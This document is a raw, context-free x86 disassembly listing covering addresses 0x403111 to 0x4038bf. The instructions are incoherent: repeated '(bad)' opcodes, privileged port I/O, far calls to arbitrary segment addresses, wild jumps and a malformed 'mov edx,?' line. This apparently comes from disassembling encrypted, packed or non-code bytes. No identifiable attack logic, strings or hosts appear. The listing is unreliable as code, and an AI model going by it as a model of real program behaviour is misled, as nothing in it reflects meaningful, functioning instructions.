  403111:	pushf  
  403112:	in     eax,dx
  403113:	lds    eax,FWORD PTR [ecx]
  403115:	retf   
  403116:	imul   esp,DWORD PTR [edi+0x16b3a6d3],0x461578ad
  403120:	or     DWORD PTR [ebx-0x6f97df0b],edi
  403126:	sub    bh,BYTE PTR [ebx]
  403128:	sbb    eax,0xf4fa9087
  40312d:	ret    
  40312e:	sbb    edi,edx
  403130:	jns    0x403166
  403132:	mov    edi,0xcc992bf2
  403137:	ds aaa 
  403139:	mov    eax,ds:0x987adb9b
  40313e:	hlt    
  40313f:	into   
  403140:	jb     0x403106
  403142:	jle    0x4030f3
  403144:	and    BYTE PTR [ebx],bl
  403146:	adc    ebp,DWORD PTR [esi+edi*1]
  403149:	jmp    0x98354824
  40314e:	adc    DWORD PTR [edx+0x77784e89],edi
  403154:	adc    al,0x38
  403156:	adc    BYTE PTR [ecx+0x58],dl
  403159:	inc    esi
  40315a:	stos   BYTE PTR es:[edi],al
  40315b:	push   ss
  40315c:	cmp    DWORD PTR [eax],0xf247b1a9
  403162:	imul   ebp,eax,0xffffffb5
  403165:	lods   al,BYTE PTR ds:[esi]
  403166:	xchg   DWORD PTR [edx],esp
  403168:	sti    
  403169:	or     dh,BYTE PTR [ebx+0x58]
  40316c:	sub    al,0xb4
  40316e:	push   eax
  40316f:	mov    cs,esi
  403171:	sub    eax,0xa80ee532
  403176:	dec    esi
  403177:	in     eax,0x3
  403179:	adc    BYTE PTR [edi-0x42],ch
  40317c:	ja     0x403108
  40317e:	or     ebx,edi
  403180:	dec    ecx
  403181:	jmp    0x4031c9
  403183:	in     al,0x38
  403185:	or     ch,BYTE PTR [ecx-0x1bce6560]
  40318b:	ror    DWORD PTR [edi-0x52],1
  40318e:	dec    edi
  40318f:	xchg   edx,eax
  403190:	sbb    al,0x4a
  403192:	add    edx,DWORD PTR [ecx-0x15fef4d3]
  403198:	dec    ecx
  403199:	mov    WORD PTR [edi],fs
  40319b:	sbb    al,0x30
  40319d:	fstp   QWORD PTR [ecx-0x3ddaaaf1]
  4031a3:	mov    edx,?
  4031a5:	in     al,0xd7
  4031a7:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031a9:	or     DWORD PTR ds:0xaa398c59,0xffffff84
  4031b0:	rcr    DWORD PTR [ecx-0x49],1
  4031b3:	out    0xa0,al
  4031b5:	sub    edi,edx
  4031b7:	push   esp
  4031b8:	hlt    
  4031b9:	(bad)  
  4031bb:	mov    dl,0x55
  4031bd:	call   FWORD PTR [edx+0x29854eb6]
  4031c3:	jmp    0x403199
  4031c5:	push   eax
  4031c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031c7:	xor    bl,BYTE PTR [ebx-0x23]
  4031ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031cb:	dec    esi
  4031cc:	pop    es
  4031cd:	daa    
  4031ce:	jno    0x4031f4
  4031d0:	ins    DWORD PTR es:[edi],dx
  4031d1:	loopne 0x403241
  4031d3:	adc    al,0x35
  4031d5:	inc    ebx
  4031d6:	xlat   BYTE PTR ds:[ebx]
  4031d7:	mov    al,0x3f
  4031d9:	sbb    al,0x79
  4031db:	nop
  4031dc:	push   esp
  4031dd:	std    
  4031de:	sub    esp,edi
  4031e0:	daa    
  4031e1:	les    edx,FWORD PTR [ebp-0x48]
  4031e4:	call   0x3168:0xf976a920
  4031eb:	sahf   
  4031ec:	xlat   BYTE PTR ds:[ebx]
  4031ed:	dec    ebx
  4031ee:	ja     0x40319c
  4031f0:	rcr    DWORD PTR [ecx],1
  4031f2:	mov    dh,0xb2
  4031f4:	dec    esp
  4031f5:	cmc    
  4031f6:	popa   
  4031f7:	add    ecx,DWORD PTR [eax+eax*8]
  4031fa:	push   es
  4031fb:	xchg   ecx,eax
  4031fc:	arpl   di,si
  4031fe:	push   ss
  4031ff:	or     BYTE PTR [ebx+0x3e1f1346],bh
  403205:	and    ch,ah
  403207:	add    DWORD PTR [esi],edi
  403209:	stos   BYTE PTR es:[edi],al
  40320a:	pushf  
  40320b:	push   cs
  40320c:	mov    eax,0x27a4d268
  403211:	mov    ebx,0xe1e4f2a7
  403216:	xor    al,0x9b
  403218:	fbld   TBYTE PTR [ebp+0x560585bb]
  40321e:	js     0x4031d1
  403220:	mov    eax,ds:0x9c48d655
  403225:	cmc    
  403226:	shl    DWORD PTR [ecx],0xdd
  403229:	pop    edi
  40322a:	addr16 mov eax,ds:0x2661
  40322e:	es xor al,0xed
  403231:	in     al,0xaa
  403233:	xor    al,0xc9
  403235:	add    dl,BYTE PTR [esi-0x51]
  403238:	jne    0x403213
  40323a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40323b:	cmp    DWORD PTR [esi],eax
  40323d:	(bad)  
  40323f:	daa    
  403240:	ins    DWORD PTR es:[edi],dx
  403241:	sahf   
  403242:	xchg   DWORD PTR [eax-0x2b],edx
  403245:	adc    bh,BYTE PTR [ebx]
  403247:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403248:	aam    0x55
  40324a:	repz adc dh,BYTE PTR [edi]
  40324d:	xchg   ebx,eax
  40324e:	js     0x403205
  403250:	or     esi,edi
  403252:	daa    
  403253:	popf   
  403254:	pop    esp
  403255:	mov    gs,WORD PTR [esi+0x761a806d]
  40325b:	rcl    DWORD PTR [eax-0x316933b0],0xc8
  403262:	mov    ah,0xbd
  403264:	or     DWORD PTR [edi],0xe
  403267:	retf   
  403268:	inc    esi
  403269:	daa    
  40326a:	pop    ss
  40326b:	pop    edi
  40326c:	std    
  40326d:	enter  0x5cfa,0x48
  403271:	into   
  403272:	sbb    al,0xa6
  403274:	dec    edx
  403275:	cdq    
  403276:	jno    0x40328d
  403278:	pop    edi
  403279:	inc    ebx
  40327a:	inc    ebx
  40327b:	inc    ebp
  40327c:	in     al,dx
  40327d:	and    DWORD PTR [eax],esi
  40327f:	xchg   ebx,eax
  403280:	ror    DWORD PTR [ecx],1
  403282:	sbb    al,cl
  403284:	sub    al,0xd1
  403286:	dec    edi
  403287:	push   0xffffff96
  403289:	push   cs
  40328a:	xor    al,0x9d
  40328c:	test   esi,edx
  40328e:	xchg   edx,eax
  40328f:	sub    cl,BYTE PTR [edi-0x310e2907]
  403295:	jns    0x4032c4
  403297:	ret    0x7ab5
  40329a:	jmp    0xdbb8a2b8
  40329f:	fnstsw WORD PTR [ecx]
  4032a1:	xor    dh,BYTE PTR [esi]
  4032a3:	push   ss
  4032a4:	test   eax,0xc5e37674
  4032a9:	loopne 0x4032aa
  4032ab:	mov    eax,0x9a049f63
  4032b0:	fcmove st,st(7)
  4032b2:	xchg   esi,eax
  4032b3:	stc    
  4032b4:	mov    dh,0x1a
  4032b6:	(bad)  
  4032b7:	ror    DWORD PTR [esi+0x78],1
  4032ba:	mov    esp,0xb09479c3
  4032bf:	xor    al,0x54
  4032c1:	aad    0xdf
  4032c3:	and    BYTE PTR [eax+0x698ecede],al
  4032c9:	and    dh,al
  4032cb:	sub    edx,0xffffffb1
  4032ce:	lock fild WORD PTR [edx]
  4032d1:	outs   dx,BYTE PTR ds:[esi]
  4032d2:	jmp    0xa076af69
  4032d7:	xchg   BYTE PTR [ebp+0x20d2989a],ah
  4032dd:	pop    ecx
  4032de:	ret    
  4032df:	dec    edx
  4032e0:	enter  0x202b,0x26
  4032e4:	xor    eax,0x9c6b4af2
  4032e9:	(bad)  
  4032ea:	add    dh,BYTE PTR [esi+0x3356bcab]
  4032f0:	and    eax,0x46a6856
  4032f5:	cmc    
  4032f6:	sbb    al,0xe0
  4032f8:	mov    eax,ds:0x9f6e20fd
  4032fd:	sub    BYTE PTR [ecx-0x34a115ba],dh
  403303:	lock cmp bh,BYTE PTR [ecx+edi*1+0x5b]
  403308:	shl    ecx,cl
  40330a:	shr    BYTE PTR [edx-0x5c],cl
  40330d:	ror    al,0x21
  403310:	out    0xb9,al
  403312:	lds    edi,FWORD PTR [eax+edx*2]
  403315:	xchg   ebx,eax
  403316:	inc    esi
  403317:	outs   dx,DWORD PTR ds:[esi]
  403318:	add    BYTE PTR [ebx],ch
  40331a:	sbb    eax,0x8f6f2a9b
  40331f:	lods   al,BYTE PTR ds:[esi]
  403320:	add    DWORD PTR ds:0x970b0b8e,ebx
  403326:	jno    0x4032c2
  403328:	jns    0x403312
  40332a:	dec    edx
  40332b:	sbb    DWORD PTR [ecx+0x4b],ebx
  40332e:	ins    BYTE PTR es:[edi],dx
  40332f:	sub    DWORD PTR [edx],ebp
  403331:	sbb    ebx,ebx
  403333:	std    
  403334:	push   0xffffffce
  403336:	or     eax,0x57eb674d
  40333b:	inc    ecx
  40333c:	push   ss
  40333d:	mov    ah,0xd1
  403340:	push   es
  403341:	push   eax
  403342:	xor    eax,0xdb2902f9
  403347:	shr    DWORD PTR [esi+0x71a49939],cl
  40334d:	jmp    0x94f9:0x65cdd963
  403354:	cmp    BYTE PTR [ebp-0x64527bb9],0xfc
  40335b:	retf   0xba22
  40335e:	xchg   esp,eax
  40335f:	test   DWORD PTR [ebx-0x22],edx
  403362:	or     al,0xe6
  403364:	jmp    0xb1be:0xbeded19a
  40336b:	retf   
  40336c:	pop    ss
  40336d:	push   ebp
  40336e:	sbb    edx,DWORD PTR [ebp-0x57]
  403371:	jne    0x403338
  403373:	pop    esp
  403374:	sar    DWORD PTR [edx+0x3f8c33c],cl
  40337a:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40337c:	cmp    ecx,ecx
  40337e:	xchg   esp,eax
  40337f:	add    edi,DWORD PTR [ebp+0x20b1b53a]
  403385:	pop    ds
  403386:	cmp    DWORD PTR [ecx],0x23
  403389:	in     al,0x81
  40338b:	jg     0x4033c7
  40338d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40338e:	jno    0x40335a
  403390:	sbb    BYTE PTR [ecx-0x78],cl
  403393:	xlat   BYTE PTR ds:[ebx]
  403394:	jbe    0x4033b6
  403396:	sub    eax,0x1e63c4de
  40339b:	or     al,0x2b
  40339d:	mov    al,ds:0xa4ce5812
  4033a2:	dec    esi
  4033a4:	aas    
  4033a5:	lahf   
  4033a6:	rcl    DWORD PTR [ebx+0x53],0x8c
  4033aa:	pop    ebp
  4033ab:	xor    DWORD PTR [esp+edi*1],ebx
  4033ae:	and    al,BYTE PTR [ebp+0x74]
  4033b1:	aad    0xa4
  4033b3:	xor    ecx,esi
  4033b5:	or     eax,0x29c4b9bd
  4033ba:	aaa    
  4033bb:	xchg   esp,eax
  4033bc:	push   esp
  4033bd:	cmp    ch,BYTE PTR [esi-0x248a158b]
  4033c3:	mov    edx,0xd3ed3715
  4033c8:	fdivrp st(7),st
  4033ca:	and    bh,BYTE PTR [eax+0x18]
  4033cd:	inc    edx
  4033ce:	mov    edi,0x7c1d4e26
  4033d3:	cli    
  4033d4:	sar    DWORD PTR [esi-0x15],0x64
  4033d8:	push   es
  4033d9:	lods   al,BYTE PTR ds:[esi]
  4033da:	fsub   QWORD PTR [edi+0x66a109ee]
  4033e0:	lock inc ebp
  4033e2:	pop    esi
  4033e3:	mov    eax,DWORD PTR [ebp-0x3008144]
  4033e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4033ea:	test   DWORD PTR [ebx+0x74],ecx
  4033ed:	call   0xf7b2:0xd65ebadb
  4033f4:	ins    DWORD PTR es:[edi],dx
  4033f5:	call   DWORD PTR [edx+0x4]
  4033f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4033f9:	fcmovnb st,st(2)
  4033fb:	(bad)  
  4033fc:	fisubr DWORD PTR cs:[edx]
  4033ff:	cdq    
  403400:	test   DWORD PTR [eax+eiz*8+0x1f],0xb0566099
  403408:	jge    0x403401
  40340a:	add    DWORD PTR [eax+0x455c0de0],ebp
  403410:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403411:	cs rcr dl,0x97
  403415:	push   esp
  403416:	or     edi,DWORD PTR [ecx+0x1c5e24d3]
  40341c:	sbb    ah,bh
  40341e:	rol    BYTE PTR [eax-0x63df4a88],0xa1
  403425:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403426:	pusha  
  403427:	(bad)  
  403428:	jbe    0x403416
  40342a:	stos   BYTE PTR es:[edi],al
  40342b:	inc    ecx
  40342c:	inc    ebx
  40342d:	push   0xffffffdd
  40342f:	xchg   esp,eax
  403430:	mov    ecx,0xc0ce537
  403435:	dec    esi
  403436:	pop    esp
  403437:	ror    BYTE PTR [ebp-0x23],1
  40343a:	jle    0x40343f
  40343c:	and    eax,0xfe48afd5
  403441:	pmaxsw mm6,QWORD PTR [eax]
  403444:	adc    eax,esp
  403446:	mov    DWORD PTR [edx],esi
  403448:	js     0x4034c5
  40344a:	xchg   ebp,eax
  40344b:	or     DWORD PTR ds:0xad368f25,eax
  403451:	inc    ecx
  403452:	xor    DWORD PTR ds:0x8b79ab7f,edi
  403458:	xchg   eax,edi
  40345a:	add    DWORD PTR [eax+0x59f59093],0x428cace3
  403464:	cmp    eax,0xaabdd15
  403469:	sbb    edx,esi
  40346b:	jo     0x40342a
  40346d:	sti    
  40346e:	and    al,0x68
  403470:	xchg   ebp,eax
  403471:	daa    
  403472:	or     bl,al
  403474:	add    edx,DWORD PTR [edi-0x66bf4919]
  40347a:	ret    
  40347b:	cmp    eax,0x1c0ccdf3
  403480:	jno    0x403486
  403482:	(bad)  
  403483:	xor    bl,BYTE PTR [ebx-0x5ff5820e]
  403489:	js     0x4034d6
  40348b:	rcr    BYTE PTR [eax+0x4fb02e0c],0x5f
  403492:	out    dx,eax
  403493:	test   eax,0x685a63ac
  403498:	cmp    eax,0xb2ec3d4b
  40349d:	push   ebp
  40349e:	xchg   ebx,eax
  40349f:	dec    ebx
  4034a0:	or     edx,DWORD PTR [eax+0x78]
  4034a3:	(bad)  
  4034a4:	dec    eax
  4034a5:	outs   dx,BYTE PTR ds:[esi]
  4034a6:	xchg   esi,eax
  4034a7:	mov    DWORD PTR [edi-0x42],ebp
  4034aa:	mov    bh,0x5d
  4034ac:	retf   
  4034ad:	bound  esp,QWORD PTR [eax]
  4034af:	stos   DWORD PTR es:[edi],eax
  4034b0:	jle    0x4034e5
  4034b2:	xchg   esp,eax
  4034b3:	push   0xffffffa9
  4034b5:	nop
  4034b6:	sub    ebx,ebx
  4034b8:	aas    
  4034b9:	adc    esi,DWORD PTR [ecx]
  4034bb:	xchg   edx,eax
  4034bc:	xchg   esi,eax
  4034bd:	push   esi
  4034be:	or     eax,0xfe64e30c
  4034c3:	cmp    bl,bl
  4034c5:	fwait
  4034c6:	test   DWORD PTR [ebx+0x45],0x224e28ff
  4034cd:	(bad)  
  4034ce:	sbb    esp,ecx
  4034d0:	(bad)
  4034d4:	adc    edi,ecx
  4034d6:	sbb    DWORD PTR [eax+0x1e6bee51],edi
  4034dc:	jnp    0x40350f
  4034de:	xchg   BYTE PTR [ecx-0x140a6756],dl
  4034e4:	mov    esp,edi
  4034e6:	inc    ebp
  4034e7:	sub    eax,edi
  4034e9:	int3   
  4034ea:	mov    DWORD PTR [esi-0x3a],edx
  4034ed:	(bad)  
  4034ef:	fdivp  st(5),st
  4034f1:	fist   DWORD PTR [edi+ebp*4]
  4034f4:	push   edi
  4034f5:	jns    0x403516
  4034f7:	jbe    0x403505
  4034f9:	shr    BYTE PTR [ebx],1
  4034fb:	jge    0x403557
  4034fd:	or     ebp,ebx
  4034ff:	into   
  403500:	rcr    BYTE PTR [eax+0x3b],0x67
  403504:	hlt    
  403505:	ins    DWORD PTR es:[edi],dx
  403506:	push   ecx
  403507:	push   es
  403508:	addr16 add esp,ecx
  40350b:	int    0x2c
  40350d:	scas   eax,DWORD PTR es:[edi]
  40350e:	mov    esp,0xe4f44b68
  403513:	add    eax,0x11f92268
  403518:	dec    edx
  403519:	sbb    ebp,DWORD PTR [eax]
  40351b:	sbb    ch,BYTE PTR [ecx-0x53]
  40351e:	or     DWORD PTR [ebx],esp
  403520:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403521:	adc    ebp,ecx
  403523:	adc    DWORD PTR [edi+0x55],esp
  403526:	frstor [ebx]
  403528:	jl     0x40352b
  40352a:	inc    ebx
  40352b:	xchg   DWORD PTR [esi+ebx*8],ebp
  40352e:	mov    ch,0xd2
  403530:	dec    esp
  403531:	addr16 repz inc edi
  403534:	(bad)  
  403535:	in     eax,dx
  403536:	std    
  403537:	and    eax,0xf665345b
  40353c:	push   ds
  40353d:	pop    edi
  40353e:	pop    es
  40353f:	sbb    eax,0xe599e0cb
  403544:	ret    
  403545:	or     eax,0xd511507c
  40354a:	mov    bl,0x57
  40354c:	(bad)  
  40354e:	inc    esi
  40354f:	dec    edx
  403550:	mov    gs,WORD PTR [esi-0x2dba9bd2]
  403556:	sub    edi,edi
  403558:	nop
  403559:	mov    dl,0xa2
  40355b:	xchg   ecx,eax
  40355c:	(bad)  
  40355d:	push   0xf
  40355f:	daa    
  403560:	dec    ebx
  403561:	sub    DWORD PTR [esi+0x1effd59e],0x2339d37d
  40356b:	jnp    0x403530
  40356d:	mov    edi,0xe041f917
  403572:	out    dx,eax
  403573:	sub    cl,BYTE PTR [edx+edi*8+0x36642864]
  40357a:	xor    bl,0x83
  40357d:	pop    ds
  40357e:	ins    DWORD PTR es:[edi],dx
  40357f:	cmc    
  403580:	std    
  403581:	shl    DWORD PTR [ecx+ebp*1-0x55],cl
  403585:	loope  0x403543
  403587:	sub    eax,0x34e26614
  40358c:	ds xchg ebp,eax
  40358e:	dec    ebp
  40358f:	inc    esp
  403590:	div    BYTE PTR [edi]
  403592:	xchg   ecx,eax
  403593:	dec    eax
  403594:	jb     0x403525
  403596:	dec    ebx
  403597:	sbb    DWORD PTR [eax+0x74],esp
  40359a:	(bad)  
  40359b:	pop    ebp
  40359c:	fucomi st,st(1)
  40359e:	imul   BYTE PTR [esi+0x65828614]
  4035a4:	out    dx,al
  4035a5:	push   eax
  4035a6:	lock add BYTE PTR [esi],0xb0
  4035aa:	retf   
  4035ab:	fistp  WORD PTR [edi+0x22209cdc]
  4035b1:	popf   
  4035b2:	mov    ds:0x8690a059,al
  4035b7:	gs aas 
  4035b9:	adc    BYTE PTR [eax-0x38],bh
  4035bc:	push   esi
  4035bd:	rcl    BYTE PTR [ebp+0x74],cl
  4035c0:	pop    esp
  4035c1:	out    dx,al
  4035c2:	bound  ebp,QWORD PTR [ebx+eax*4]
  4035c5:	jne    0x403641
  4035c7:	mov    ah,BYTE PTR [edi]
  4035c9:	fidiv  WORD PTR [ebp+0x41]
  4035cc:	mov    BYTE PTR [esp+ecx*2-0x1c],dh
  4035d0:	mov    es,esp
  4035d2:	mov    edx,0xb72ae19e
  4035d7:	test   DWORD PTR [edx+ebx*8+0x450678b2],eax
  4035de:	jns    0x40357f
  4035e0:	or     al,0x93
  4035e2:	sti    
  4035e3:	push   eax
  4035e4:	std    
  4035e5:	push   ebp
  4035e6:	sbb    eax,0x40add9f6
  4035eb:	cdq    
  4035ec:	jmp    0x390e5a28
  4035f1:	jg     0x4035d0
  4035f3:	outs   dx,DWORD PTR ds:[esi]
  4035f4:	pop    ebx
  4035f5:	or     DWORD PTR [edx+0x398db266],ecx
  4035fb:	in     eax,0x20
  4035fd:	ins    DWORD PTR es:[edi],dx
  4035fe:	add    DWORD PTR [ecx],edi
  403600:	sbb    eax,0x72755fdf
  403605:	call   0xe214:0xf2159f29
  40360c:	sar    bh,1
  40360e:	add    DWORD PTR [eax-0x715ec14a],0xffffffe3
  403615:	add    DWORD PTR [edi+0xf],eax
  403618:	sbb    bh,ah
  40361a:	and    ebp,esp
  40361c:	pop    ebp
  40361d:	pop    eax
  40361e:	pop    ds
  40361f:	cmp    bh,BYTE PTR [edi]
  403621:	dec    edx
  403622:	or     al,0xa6
  403624:	xchg   DWORD PTR [edi],edx
  403626:	and    BYTE PTR [ebp+0x619f1bcc],dh
  40362c:	in     al,0x3b
  40362e:	shr    DWORD PTR [edx+0x4a],0x2d
  403632:	imul   edi,DWORD PTR [ecx+ebp*2],0x601e208f
  403639:	add    esp,DWORD PTR [edi+0x28eef018]
  40363f:	mov    al,BYTE PTR [eax]
  403641:	mov    ds:0xc3c2e280,al
  403646:	leave  
  403647:	pop    ecx
  403648:	push   ebx
  40364a:	lds    edi,FWORD PTR [ecx-0x43]
  40364d:	test   eax,0xb77f87ca
  403652:	pop    eax
  403653:	jae    0x4036a5
  403655:	mov    dh,0x6b
  403657:	nop
  403658:	or     eax,DWORD PTR [esi+eiz*8+0x476787b4]
  40365f:	in     al,dx
  403660:	dec    ebp
  403661:	icebp  
  403662:	pop    ds
  403663:	sub    BYTE PTR [edx-0xa232010],cl
  403669:	pushf  
  40366a:	imul   eax,DWORD PTR [esi],0x3d3068d4
  403670:	jno    0x40361f
  403672:	and    BYTE PTR [edi-0x1bd32048],0x26
  403679:	test   BYTE PTR [esp+eax*2],al
  40367c:	in     eax,dx
  40367d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40367e:	scas   eax,DWORD PTR es:[edi]
  40367f:	dec    ebp
  403680:	sti    
  403681:	inc    ebp
  403682:	fisttp QWORD PTR [ecx-0x69]
  403685:	pop    es
  403686:	xchg   ebx,eax
  403687:	test   BYTE PTR [ecx+esi*8+0x75c7d443],dl
  40368e:	(bad)  
  40368f:	sub    DWORD PTR [ebx+edi*2+0x5832d2ff],ecx
  403696:	js     0x4036de
  403698:	jae    0x40368e
  40369a:	cmp    al,0x67
  40369c:	sbb    al,0xb
  40369e:	ret    0xc5b4
  4036a1:	shl    DWORD PTR ds:0x7ebb8dd7,1
  4036a7:	fst    QWORD PTR [ecx+0x735b0729]
  4036ad:	or     ebx,ecx
  4036af:	xchg   BYTE PTR [esi-0x49],ch
  4036b2:	adc    BYTE PTR [ebp+0x85628c4],al
  4036b8:	sar    BYTE PTR [esi],1
  4036ba:	inc    ecx
  4036bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4036bc:	jne    0x4036d9
  4036be:	jecxz  0x403730
  4036c0:	pusha  
  4036c1:	cmp    al,0x51
  4036c3:	enter  0xb796,0x95
  4036c7:	enter  0xe7d7,0x26
  4036cb:	clc    
  4036cc:	adc    bh,BYTE PTR [ecx+0x35]
  4036cf:	hlt    
  4036d0:	xor    eax,DWORD PTR [ebp+ebp*2-0x5d]
  4036d4:	mul    DWORD PTR [ecx]
  4036d6:	(bad)  
  4036d8:	scas   al,BYTE PTR es:[edi]
  4036d9:	mov    bh,0x40
  4036db:	daa    
  4036dc:	adc    eax,0xa7ae65c2
  4036e1:	aad    0x68
  4036e3:	sub    DWORD PTR [esi+0x17f2b69c],ebx
  4036e9:	pop    ebx
  4036ea:	jo     0x40375d
  4036ec:	repnz cdq 
  4036ee:	leave  
  4036ef:	out    dx,eax
  4036f0:	cs jo  0x40375d
  4036f3:	mov    edx,0x13990d4e
  4036f8:	sbb    al,0x1
  4036fa:	scas   al,BYTE PTR es:[edi]
  4036fb:	pop    ss
  4036fc:	push   eax
  4036fd:	mov    edx,0x1636189c
  403702:	call   0xcee1c24a
  403707:	or     cl,BYTE PTR [ebp+0x3a]
  40370a:	test   eax,0x2842d7d9
  40370f:	push   eax
  403710:	pop    edi
  403711:	jnp    0x40372c
  403713:	jne    0x403784
  403715:	aas    
  403716:	inc    ebp
  403717:	and    eax,0xcd483b7c
  40371c:	sbb    DWORD PTR [ebp-0x662cdb08],ebp
  403722:	pop    ebp
  403723:	dec    esp
  403724:	sbb    ah,BYTE PTR [esi]
  403726:	clc    
  403727:	into   
  403728:	dec    ebp
  403729:	dec    edx
  40372a:	xor    al,0x8b
  40372c:	(bad)  
  40372d:	push   ss
  40372e:	mov    ch,0x98
  403730:	div    DWORD PTR [ebx+0x6de1ab96]
  403736:	gs ds test eax,0x5db97632
  40373d:	adc    dl,bh
  40373f:	adc    DWORD PTR [edx],0xe10e2f68
  403745:	je     0x4037a8
  403747:	inc    ebx
  403748:	gs std 
  40374a:	dec    eax
  40374b:	lock jecxz 0x403785
  40374e:	(bad)  
  40374f:	push   0xffffffe6
  403751:	pushf  
  403752:	cmp    al,0xfc
  403754:	int    0x67
  403756:	mov    esi,ebp
  403758:	dec    esp
  403759:	add    eax,0x1af86b8a
  40375e:	addr16 mov ch,0xa6
  403761:	adc    al,0x7b
  403763:	push   ebx
  403764:	out    dx,eax
  403765:	ds mov bl,0xab
  403768:	scas   eax,DWORD PTR es:[edi]
  403769:	iret   
  40376a:	test   DWORD PTR ds:0xba54c8dc,ecx
  403770:	pusha  
  403771:	jl     0x403784
  403773:	or     DWORD PTR [ecx+edx*8+0x78],0x31641af1
  40377b:	push   eax
  40377c:	jge    0x403723
  40377e:	inc    ecx
  40377f:	cmp    al,0x5b
  403781:	jmp    0xa9a57005
  403786:	test   al,0x3a
  403788:	ins    DWORD PTR es:[edi],dx
  403789:	mov    bh,0x47
  40378b:	xor    DWORD PTR [edi],ebx
  40378d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40378e:	and    eax,0x2bb40862
  403793:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403794:	xor    bh,BYTE PTR [edi+0x61]
  403797:	sub    eax,0x94fee08f
  40379c:	retf   0xc98f
  40379f:	mov    dh,0x98
  4037a1:	add    DWORD PTR [ecx+0x64],esi
  4037a4:	fcomp  st(6)
  4037a6:	loop   0x403739
  4037a8:	scas   eax,DWORD PTR es:[edi]
  4037a9:	xchg   esp,eax
  4037aa:	xchg   DWORD PTR [edx],eax
  4037ac:	xchg   ecx,eax
  4037ad:	push   0x43
  4037af:	imul   esp,DWORD PTR [esi-0x5b],0x4e4a2721
  4037b6:	div    DWORD PTR [edi+0x73]
  4037b9:	loope  0x4037a2
  4037bb:	jecxz  0x40381a
  4037bd:	pop    ebp
  4037be:	cmp    al,0xb8
  4037c0:	aam    0x5f
  4037c2:	lahf   
  4037c3:	aaa    
  4037c4:	jge    0x4037ae
  4037c6:	fcmovne st,st(6)
  4037c8:	pushf  
  4037c9:	das    
  4037ca:	inc    edi
  4037cb:	jo     0x547e4aec
  4037d1:	mov    eax,ds
  4037d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4037d4:	mov    ds:0xfa2798b9,eax
  4037d9:	in     al,0x75
  4037db:	mov    esi,0xb84434a9
  4037e0:	adc    ah,BYTE PTR [esi]
  4037e2:	or     BYTE PTR [esi],cl
  4037e4:	jo     0x4037f5
  4037e6:	sbb    al,bl
  4037e8:	aam    0x3b
  4037ea:	mov    cl,0xc7
  4037ec:	(bad)  
  4037ed:	jno    0x40381b
  4037ef:	sbb    eax,0x1439150
  4037f4:	sbb    eax,DWORD PTR [edx-0x2]
  4037f7:	repnz dec eax
  4037f9:	iret   
  4037fa:	sub    BYTE PTR [ebp+0x3273f929],ah
  403800:	jl     0x40382a
  403802:	sahf   
  403803:	pushf  
  403804:	loope  0x403828
  403806:	dec    ebp
  403807:	push   eax
  403808:	repnz (bad) 
  40380a:	int    0xb2
  40380c:	out    dx,eax
  40380d:	or     eax,0x9df8f6d5
  403812:	mov    ecx,0xf2a546c
  403817:	clc    
  403818:	mov    eax,ds:0xd85fa4f5
  40381d:	pushf  
  40381e:	cld    
  40381f:	ins    BYTE PTR es:[edi],dx
  403820:	sbb    al,0xba
  403822:	mov    bh,0x86
  403824:	iret   
  403825:	and    al,0x95
  403827:	sub    al,0x41
  403829:	xor    esi,DWORD PTR [edi]
  40382b:	mov    es,WORD PTR [edx-0x49eec8d8]
  403831:	test   eax,0xade564c4
  403836:	aam    0x55
  403838:	daa    
  403839:	pop    es
  40383a:	test   al,0x4e
  40383c:	inc    ebp
  40383d:	rcr    BYTE PTR [edi+esi*4+0x41],cl
  403841:	dec    eax
  403842:	mov    cl,0x9c
  403844:	adc    ebp,DWORD PTR [ecx]
  403846:	popf   
  403847:	and    bl,BYTE PTR [ebx]
  403849:	clc    
  40384a:	imul   esp,DWORD PTR [eax+0x3371f976],0xb0d54bfa
  403854:	xchg   edx,eax
  403855:	ror    DWORD PTR [ebx+0x6184df34],cl
  40385b:	outs   dx,BYTE PTR ds:[esi]
  40385c:	das    
  40385d:	fcmovb st,st(6)
  40385f:	sub    eax,0xed0d81c7
  403864:	sub    ebp,DWORD PTR [edi-0x40b6b9d8]
  40386a:	in     eax,dx
  40386b:	in     eax,0x7
  40386d:	int3   
  40386e:	out    0x8d,al
  403870:	icebp  
  403871:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403872:	fst    QWORD PTR [edx+0x3a]
  403875:	lahf   
  403876:	call   0xa06f:0x8d805ffe
  40387d:	inc    edi
  40387e:	mov    BYTE PTR [eax+0x6c33f0bb],ah
  403884:	xchg   ebx,eax
  403885:	pop    eax
  403886:	push   ebp
  403887:	lods   eax,DWORD PTR ds:[esi]
  403888:	add    ah,dh
  40388a:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40388c:	jecxz  0x40385b
  40388e:	or     dh,BYTE PTR [esi-0x55]
  403891:	(bad)  
  403892:	repnz sub BYTE PTR [edi+eax*8-0x6b],0xec
  403898:	enter  0xff4e,0xb6
  40389c:	jle    0x4038b6
  40389e:	out    0xc3,al
  4038a0:	xchg   edi,eax
  4038a1:	cs dec eax
  4038a3:	je     0x403872
  4038a5:	pop    ebp
  4038a6:	ja     0x4038d7
  4038a8:	in     eax,0xd4
  4038aa:	inc    BYTE PTR [edi-0x257f0124]
  4038b0:	mov    ds:0x19971a5,eax
  4038b5:	lahf   
  4038b6:	jns    0x40388c
  4038b8:	mov    edx,0x30b9e98b
  4038bd:	cdq    
  4038be:	lods   al,BYTE PTR ds:[esi]
  4038bf:	clc    
